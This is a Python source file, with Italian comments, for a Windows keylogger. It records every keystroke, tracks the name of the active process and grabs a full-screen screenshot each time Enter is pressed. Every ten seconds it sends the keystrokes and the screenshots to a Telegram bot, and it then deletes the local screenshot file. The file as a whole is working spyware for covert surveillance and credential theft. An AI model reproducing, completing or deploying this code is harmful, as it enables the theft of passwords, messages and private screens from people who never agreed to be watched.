import time as t
from pynput import keyboard as k
import requests
from PIL import ImageGrab
import os
import psutil
import win32gui
import win32process

# Telegram Bot Configuration
BOT_API_TOKEN = ""
USER_ID = ""
LOG_INTERVAL = 10

keystrokes = []
current_process_name = "unknown.exe"

def get_active_process_name():
    try:
        # Ottieni la finestra attiva
        hwnd = win32gui.GetForegroundWindow()
        # Ottieni il PID del processo associato alla finestra
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        # Ottieni il nome del processo
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['pid'] == pid:
                    return proc.info['name']
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "unknown.exe"
    except Exception:
        return "unknown.exe"

def send_telegram_message(body):
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": body,
            "parse_mode": "Markdown"  #  Supporto Markdown
        }
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Messaggio correttamente inviato al bot.")
        else:
            print(f"c'è stato un problema. Status Code: {response.status_code}")
            print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {e}")

def send_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)

        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendPhoto"
        with open(screenshot_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': USER_ID}
            response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print("✅ Screenshot inviato correttamente.")
        else:
            print(f"❌ Errore nell'invio dello screenshot: {response.status_code}")
            print(f"Response: {response.text}")

        # Cancella il file dopo l'invio
        os.remove(screenshot_path)
        print("🗑️ File screenshot cancellato.")

    except Exception as e:
        print(f"❌ Errore durante l'invio dello screenshot: {e}")

def on_press(key):
    global current_process_name
    try:
        # Aggiorna il processo attivo solo quando cambia
        new_process = get_active_process_name()
        if new_process != current_process_name:
            current_process_name = new_process
            print(f"🔄 Processo cambiato: {current_process_name}")

        if hasattr(key, 'char') and key.char is not None:
            keystrokes.append(key.char)
        else:
            key_name = str(key).replace('Key.', '').lower()
            keystrokes.append(f"[{key_name}]")

            print(f"Tasto premuto: {key_name}")

            # Se premi Invio, invia uno screenshot
            if key_name == 'enter':
                print("🚀 Premuto INVIO! Invio screenshot...")
                send_screenshot()

    except Exception as e:
        print(f"Errore durante la gestione del tasto: {e}")

listener = k.Listener(on_press=on_press)
listener.start()

try:
    while True:
        t.sleep(LOG_INTERVAL)
        if keystrokes:
            log_data = ''.join(keystrokes)
            if len(log_data) > 4096:
                log_data = log_data[:4093] + "..."
            #  Formattazione per il bot
            full_message = f"⚙️ Processo attivo: `{current_process_name}`\n-------------------------------\nKeystrokes:\n```\n{log_data}\n```"
            send_telegram_message(full_message)
            keystrokes.clear()

except KeyboardInterrupt:
    print("\nUscendo dal keylogger...")
